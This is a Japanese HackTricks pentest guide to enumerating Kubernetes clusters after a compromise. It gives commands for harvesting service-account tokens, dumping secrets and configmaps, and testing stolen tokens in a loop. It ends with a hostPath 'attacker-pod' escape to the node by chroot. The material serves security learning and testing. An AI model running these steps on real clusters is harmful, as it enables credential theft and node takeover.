# Kubernetes 列挙

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見する、私たちの独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクション
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に **参加する** か、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
* **HackTricks** の [**GitHub リポジトリ**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) に PR を提出して、あなたのハッキングのコツを共有する。

</details>

## Kubernetes トークン

マシンへのアクセスが侵害された場合、ユーザーは Kubernetes プラットフォームへのアクセス権を持っている可能性があります。トークンは通常、**環境変数 `KUBECONFIG`** によって指定されたファイルにあるか、**`~/.kube` 内にあります**。

このフォルダには、**API サーバーに接続するためのトークンと設定が含まれた設定ファイル**が見つかるかもしれません。このフォルダには、以前に取得した情報を含むキャッシュフォルダも見つかることがあります。

Kubernetes 環境内のポッドが侵害された場合、現在の K8 環境に関するトークンと情報を見つけることができる他の場所があります：

### サービスアカウントトークン

続ける前に、Kubernetes のサービスが何であるかわからない場合は、**このリンクに従って少なくとも Kubernetes アーキテクチャに関する情報を読むことをお勧めします**。

Kubernetes [ドキュメント](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) からの引用：

_「ポッドを作成するとき、サービスアカウントを指定しない場合、自動的に同じ名前空間の_ default _サービスアカウントが割り当てられます。」_

**ServiceAccount** は Kubernetes によって管理されるオブジェクトで、ポッド内で実行されるプロセスにアイデンティティを提供するために使用されます。\
すべてのサービスアカウントにはそれに関連するシークレットがあり、このシークレットにはベアラートークンが含まれています。これは JSON Web Token (JWT) であり、2つの当事者間で安全に主張を表現する方法です。

通常、以下のディレクトリの**いずれか**には：

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

以下のファイルが含まれています：

* **ca.crt**：Kubernetes 通信をチェックするための ca 証明書
* **namespace**：現在の名前空間を示します
* **token**：現在のポッドの**サービストークン**を含んでいます。

トークンを手に入れたら、環境変数 **`KUBECONFIG`** 内で API サーバーを見つけることができます。詳細については `(env | set) | grep -i "kuber|kube`**`"`** を実行してください。

サービスアカウントトークンは、ファイル **sa.key** にあるキーによって署名され、**sa.pub** によって検証されます。

**Kubernetes** のデフォルトの場所：

* /etc/kubernetes/pki

**Minikube** のデフォルトの場所：

* /var/lib/localkube/certs

### ホットポッド

_**ホットポッド**_ は、特権サービスアカウントトークンを含むポッドです。特権サービスアカウントトークンは、シークレットのリスト、ポッドの作成などの特権タスクを実行する権限を持つトークンです。

## RBAC

**RBAC** が何であるかわからない場合は、**このセクションを読んでください**。

## 列挙チートシート

K8s 環境を列挙するには、以下のものが必要です：

* **有効な認証トークン**。前のセクションで、ユーザートークンとサービスアカウントトークンを探す場所を見ました。
* Kubernetes API の **アドレス (**_**https://host:port**_**)。これは通常、環境変数や kube 設定ファイルで見つけることができます。
* **オプション**：API サーバーを検証するための **ca.crt**。これはトークンが見つかるのと同じ場所で見つけることができます。これは API サーバー証明書を検証するのに役立ちますが、`kubectl` で `--insecure-skip-tls-verify` を使用するか、`curl` で `-k` を使用すると、これは必要ありません。

これらの詳細を持っていれば、**kubernetes を列挙する**ことができます。何らかの理由で **API** が **インターネット** を通じて **アクセス可能** である場合は、その情報をダウンロードして、ホストからプラットフォームを列挙することができます。

しかし、通常 **API サーバーは内部ネットワーク内にあります**。そのため、侵害されたマシンを通じてトンネルを作成して、あなたのマシンからアクセスする必要があります。または、[**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) バイナリをアップロードするか、API サーバーに対して生の HTTP リクエストを実行するために **`curl/wget/anything`** を使用することができます。

### `list` と `get` 動詞の違い

**`get`** 権限を持っていると、特定のアセットの情報にアクセスできます（_`kubectl`_ の _`describe` オプション）API：
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
**`list`** 権限がある場合、特定のアセットタイプをリストするためのAPIリクエストを実行することが許可されます（_`kubectl` の `get` オプション_）：
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
**`watch`** 権限を持っている場合、アセットを監視するためにAPIリクエストを実行することが許可されています：
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
ストリーミング接続を開くと、Deploymentの完全なマニフェストが変更されたとき（または新しいものが作成されたとき）に返されます。

{% hint style="danger" %}
以下の`kubectl`コマンドはオブジェクトをリストする方法を示しています。データにアクセスするには`get`の代わりに`describe`を使用する必要があります。
{% endhint %}

### curlを使用する

ポッドの内部からいくつかの環境変数を使用できます：
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
デフォルトでは、ポッドはドメイン名 **`kubernetes.default.svc`** で **kube-apiサーバー** に**アクセス**でき、**`/etc/resolv.config`** でkubeネットワークを確認できます。ここではkubernetes DNSサーバーのアドレスが見つかります（同じ範囲の".1"がkube-apiエンドポイントです）。
{% endhint %}

### kubectlの使用

トークンとAPIサーバーのアドレスを持っている場合、ここに示されているようにkubectlまたはcurlを使用してアクセスします：

デフォルトでは、APISERVERは `https://` スキーマで通信しています
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> URLに`https://`が含まれていない場合、Bad Requestのようなエラーが発生する可能性があります。

[**公式のkubectlチートシートはこちら**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/)です。以下のセクションの目的は、アクセスを取得した新しいK8sを列挙し、理解するための異なるオプションを順序立てて提示することです。

`kubectl`が送信するHTTPリクエストを見つけるには、パラメータ`-v=8`を使用できます。

#### MitM kubectl - kubectlのプロキシ化
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### 現在の設定

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

もし何らかのユーザーのクレデンシャルを盗むことができたら、以下のような方法で**ローカルに設定**することができます：
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### サポートされるリソースの取得

この情報をもとに、リストアップ可能なすべてのサービスを知ることができます。

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### 現在の権限を取得する

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

権限を確認する別の方法は、ツールを使用することです: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

**Kubernetes RBAC**についての詳細は以下を参照してください:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**どの権限を持っているかを知ったら**、次のページを確認して、**それらを悪用して権限を昇格させることができるか**を判断してください:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### 他のロールを取得する

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### ネームスペースの取得

Kubernetesは、同じ物理クラスターによって支えられる**複数の仮想クラスター**をサポートしています。これらの仮想クラスターは**ネームスペース**と呼ばれます。

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### シークレットを取得する

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

シークレットを読むことができる場合、以下の行を使用して、各トークンに関連する権限を取得できます:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### サービスアカウントの取得

このページの冒頭で説明したように、**ポッドが実行されると通常、それにサービスアカウントが割り当てられます**。したがって、サービスアカウントとその権限をリストし、どこで実行されているかを知ることで、ユーザーは権限の昇格を図ることができるかもしれません。

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### デプロイメントの取得

デプロイメントは、**実行**する必要がある**コンポーネント**を指定します。

{% tabs %}
{% tab title="kubectl" %}
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### ポッドの取得

ポッドは実際に**実行される** **コンテナ**です。

{% tabs %}
{% tab title="kubectl" %}
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### サービスの取得

Kubernetesの**サービス**は、特定のポートとIPでサービスを**公開するために使用されます**（実際にサービスを提供しているポッドへのロードバランサーとして機能します）。これは、攻撃を試みる他のサービスを見つける場所を知るために興味深いです。

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### ノードの取得

**クラスター内で設定されているすべてのノード**を取得します。

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### DaemonSetsの取得

**DaemonSets** は、クラスターの全ノード（または選択されたノード）で**特定のポッドが実行されていること**を保証するために使用されます。DaemonSetを削除すると、それによって管理されているポッドも削除されます。

{% tabs %}
{% tab title="kubectl" %}
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### cronjobの取得

cronjobは、crontabのような構文を使用して、何らかのアクションを実行するpodの起動をスケジュールすることを可能にします。

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### configMapの取得

configMapには、Kubernetes内で実行されるアプリケーションに提供される多くの情報や設定ファイルが常に含まれています。通常、他の内部/外部サービスへの接続や検証に使用される多くのパスワード、シークレット、トークンが見つかります。

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}

{% endtabs %}


### "all"を取得する

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
{% endtab %}
{% endtabs %}

### **ポッドの消費状況を取得する**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Podからの脱出

新しいPodを作成できる場合、それらからノードへの脱出が可能になるかもしれません。これを行うには、yamlファイルを使用して新しいPodを作成し、作成されたPodに切り替えてから、ノードのシステムにchrootします。yamlファイルの参照として既存のPodを使用できます。なぜなら、それらは既存のイメージやパスを表示するからです。
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> 特定のノード上でpodを作成する必要がある場合、以下のコマンドを使用してノードのラベルを取得できます
>
> `k get nodes --show-labels`
>
> 一般的に、kubernetes.io/hostname と node-role.kubernetes.io/master は選択に適したラベルです。
>
> [参照]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

その後、攻撃用のattack.yamlファイルを作成します。
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
```markdown
[オリジナルのyamlソース](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

その後、podを作成します
```
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
```markdown
作成したポッドに次のように切り替えることができます
```
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
最後に、ノードのシステムにchrootします
```bash
chroot /root /bin/bash
```
以下の情報は、次のソースから取得しました：[Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube – Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## 参考文献

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
